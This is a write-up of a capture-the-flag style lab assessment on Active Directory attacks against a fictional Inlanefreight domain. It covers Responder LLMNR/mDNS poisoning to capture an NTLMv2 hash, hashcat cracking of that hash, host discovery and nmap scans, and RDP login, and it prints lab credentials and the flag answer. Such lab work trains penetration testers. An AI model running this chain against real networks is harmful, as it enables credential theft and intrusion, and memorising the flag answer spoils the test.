## AD Enumeration & Attacks - Skills Assessment Part II

**Scenario**

Our client Inlanefreight has contracted us again to perform a full-scope internal penetration test. The client is looking to find and remediate as many flaws as possible before going through a merger & acquisition process. The new CISO is particularly worried about more nuanced AD security flaws that may have gone unnoticed during previous penetration tests. The client is not concerned about stealth/evasive tactics and has also provided us with a Parrot Linux VM within the internal network to get the best possible coverage of all angles of the network and the Active Directory environment. Connect to the internal attack host via SSH (you can also connect to it using xfreerdp as shown in the beginning of this module) and begin looking for a foothold into the domain. Once you have a foothold, enumerate the domain and look for flaws that can be utilized to move laterally, escalate privileges, and achieve domain compromise.

Apply what you learned in this module to compromise the domain and answer the questions below to complete part II of the skills assessment.

1- **Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?**

To begin, I connected to the target machine using RDP with the provided credentials:
```c
xfreerdp /v:10.129.102.204 /u:htb-student /p:HTB_@cademy_stdnt! /drive:Desktop,/home/htb-ac-1310789/Desktop
```
Once connected, I opened a Parrot terminal and checked the available network interfaces:
```c
┌─[htb-student@skills-par01]─[~]
└──╼ $ifconfig
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:18:21:02:9a  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.19.144  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::12ed:a81:35e1:9eaf  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::9a30:76ee:9f3a:191f  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b0:2b:a6  txqueuelen 1000  (Ethernet)
        RX packets 22323  bytes 1839476 (1.7 MiB)
        RX errors 0  dropped 161  overruns 0  frame 0
        TX packets 13007  bytes 30822926 (29.3 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.7.240  netmask 255.255.254.0  broadcast 172.16.7.255
        inet6 fe80::2957:2d31:5225:229a  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b0:81:ec  txqueuelen 1000  (Ethernet)
        RX packets 704  bytes 48578 (47.4 KiB)
        RX errors 0  dropped 25  overruns 0  frame 0
        TX packets 800  bytes 35140 (34.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 299  bytes 31213 (30.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 299  bytes 31213 (30.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
The output revealed multiple interfaces, including ens224, which was connected to an internal network. Since ens224 was part of an internal network, I decided to run Responder against it to capture authentication attempts:
```c
sudo responder -I ens224 -v
```

After running Responder, I successfully intercepted an NTLMv2 hash from a user attempting to authenticate over the network:
```c
[*] [MDNS] Poisoned answer sent to 172.16.7.3      for name INLANEFRIGHT.LOCAL
[*] [LLMNR]  Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT
[SMB] NTLMv2-SSP Client   : 172.16.7.3
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\AB920
[SMB] NTLMv2-SSP Hash     : AB920::INLANEFREIGHT:176f3b0810525d52:4D099A42FE282DF41F240733F23A9768:0101000000000000804C7F58BB9FDB0117D82F0F578E217B0000000002000800380034003800590001001E00570049004E002D005A003400390033005500490055003200570047004A0004003400570049004E002D005A003400390033005500490055003200570047004A002E0038003400380059002E004C004F00430041004C000300140038003400380059002E004C004F00430041004C000500140038003400380059002E004C004F00430041004C0007000800804C7F58BB9FDB010600040002000000080030003000000000000000000000000020000045D8985FF53F7DB1DACDDB6F0FB6F822B0B96E4674D43EF6D100F08948F9CDB20A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
```

2- **What is this user's cleartext password?**

I copied the hash to my attack host and used hashcat to crack it:
```c
hashcat -m 5600 AB920_hash.txt /usr/share/wordlists/rockyou.txt

<snip>
AB920::INLANEFREIGHT:176f3b0810525d52:4d099a42fe282df41f240733f23a9768:0101000000000000804c7f58bb9fdb0117d82f0f578e217b0000000002000800380034003800590001001e00570049004e002d005a003400390033005500490055003200570047004a0004003400570049004e002d005a003400390033005500490055003200570047004a002e0038003400380059002e004c004f00430041004c000300140038003400380059002e004c004f00430041004c000500140038003400380059002e004c004f00430041004c0007000800804c7f58bb9fdb010600040002000000080030003000000000000000000000000020000045d8985ff53f7db1dacddb6f0fb6f822b0b96e4674d43ef6d100f08948f9cdb20a0010000000000000000000000000000000000009002e0063006900660073002f0049004e004c0041004e0045004600520049004700480054002e004c004f00430041004c00000000000000000000000000:weasal
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: AB920::INLANEFREIGHT:176f3b0810525d52:4d099a42fe282...000000
Time.Started.....: Fri Mar 28 07:46:37 2025 (0 secs)
Time.Estimated...: Fri Mar 28 07:46:37 2025 (0 secs)
<snip>
```
3-  **Submit the contents of the C:\flag.txt file on MS01.**

To discover active hosts on the network, I performed a ping sweep:

```c
┌─[htb-student@skills-par01]─[~]
└──╼ $for ip in {1..254}; do (ping -c 1 -W 1 172.16.7.$ip | grep "64 bytes" &); done
64 bytes from 172.16.7.3: icmp_seq=1 ttl=128 time=0.564 ms
64 bytes from 172.16.7.50: icmp_seq=1 ttl=128 time=0.479 ms
64 bytes from 172.16.7.60: icmp_seq=1 ttl=128 time=0.601 ms
64 bytes from 172.16.7.240: icmp_seq=1 ttl=64 time=0.076 ms
```
This revealed four active hosts on the 172.16.7.0/24 network.

I used nmblookup to determine which host corresponds to MS01:


```c
┌─[htb-student@skills-par01]─[~]
└──╼ nmblookup -A 172.16.7.50
Looking up status of 172.16.7.50
	MS01            <00> -         B <ACTIVE> 
	INLANEFREIGHT   <00> - <GROUP> B <ACTIVE> 
	MS01            <20> -         B <ACTIVE> 

	MAC Address = 00-50-56-B0-61-67
```

Next, I ran an Nmap scan to identify open ports and services:

```c
┌─[htb-student@skills-par01]─[~]
└──╼ $nmap -sC -sV 172.16.7.50
Starting Nmap 7.92 ( https://nmap.org ) at 2025-03-28 08:59 EDT
Nmap scan report for 172.16.7.50
Host is up (0.035s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=MS01.INLANEFREIGHT.LOCAL
| Not valid before: 2025-03-27T11:38:37
|_Not valid after:  2025-09-26T11:38:37
|_ssl-date: 2025-03-28T12:59:58+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: MS01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: MS01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2025-03-28T12:59:53+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-03-28T12:59:53
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: MS01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:61:67 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.86 seconds
```
The presence of RDP (Remote Desktop Protocol) on port 3389 indicates a potential method of access.


Using the identified credentials, I initiated an RDP session to the MS01 host:

```c
xfreerdp /u:AB920  /p:weasal /d:INLANEFREIGHT.LOCAL  /v:172.16.7.50
```
Once connected, I navigated to  C:\ and successfully retrieved the flag: aud1t_gr0up_m3mbersh1ps!
